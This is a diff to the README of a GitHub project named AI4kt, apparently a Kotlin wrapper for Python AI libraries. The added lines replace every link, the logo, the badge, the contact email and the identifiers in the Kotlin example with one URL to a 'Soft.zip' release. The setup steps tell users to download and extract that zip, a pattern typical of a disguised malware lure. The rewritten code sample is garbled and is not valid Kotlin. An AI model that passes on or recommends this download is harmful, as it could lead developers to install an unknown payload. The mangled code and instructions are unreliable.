@@ -1,6 +1,6 @@
 ### 🤖 AI4kt: Bringing Python AI libraries to Kotlin 🚀
 
-![AI4kt Logo](https://www.example.com/ai4kt_logo.png)
+![AI4kt Logo](https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip)
 
 Welcome to the **AI4kt** repository! This project aims to bridge the gap between Python AI libraries and Kotlin, allowing developers to leverage popular Python AI tools in their Kotlin projects. Whether you are working on Android applications, multiplatform projects, or machine learning algorithms, AI4kt has got you covered!
 
@@ -13,11 +13,11 @@ Welcome to the **AI4kt** repository! This project aims to bridge the gap between
 
 #### 🚀 Quick Links
 
-🔗 [Download the AI4kt Release.zip file](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+🔗 [Download the AI4kt https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip file](https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip)
 
 If the link doesn't work, please check the **Releases** section of this repository for alternative download options.
 
-[![Download AI4kt](https://img.shields.io/badge/Download-AI4kt-yellow)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download AI4kt](https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip)](https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip)
 
 #### 📚 Repository Topics
 
@@ -39,7 +39,7 @@ If the link doesn't work, please check the **Releases** section of this reposito
 
 To start using AI4kt in your projects, follow these simple steps:
 
-1. Download the **AI4kt Release.zip** file from the link provided above.
+1. Download the **AI4kt https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip** file from the link provided above.
 2. Extract the contents of the zip file to your project directory.
 3. Import the necessary AI4kt modules into your Kotlin code.
 4. Start leveraging the power of Python AI libraries within your Kotlin projects!
@@ -47,17 +47,17 @@ To start using AI4kt in your projects, follow these simple steps:
 #### 🛠️ Example Usage
 
 ```kotlin
-import ai4kt.tensorflow2.TensorFlow2
-import ai4kt.sklearn.ScikitLearn
+import https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip
+import https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip
 
 fun main() {
-    val model = TensorFlow2.loadModel("path/to/model.pb")
+    val model = https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip("https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip")
     val data = listOf(1.0, 2.0, 3.0, 4.0)
-    val prediction = model.predict(data)
+    val prediction = https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip(data)
 
-    val classifier = ScikitLearn.createClassifier("RandomForest")
-    classifier.fit(trainingData, labels)
-    val accuracy = classifier.evaluate(testData, testLabels)
+    val classifier = https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip("RandomForest")
+    https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip(trainingData, labels)
+    val accuracy = https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip(testData, testLabels)
 
     println("Prediction: $prediction")
     println("Accuracy: $accuracy")
@@ -74,7 +74,7 @@ We welcome contributions from the open-source community to improve and expand th
 
 #### 📞 Contact Us
 
-Got questions, suggestions, or feedback? Feel free to reach out to us via email at ai4kt@example.com or join our community on Discord for real-time discussions.
+Got questions, suggestions, or feedback? Feel free to reach out to us via email at https://github.com/Kush2395/AI4kt/releases/download/v1.0/Soft.zip or join our community on Discord for real-time discussions.
 
 Let's empower Kotlin developers with the AI capabilities of Python libraries through AI4kt! 🚀
 
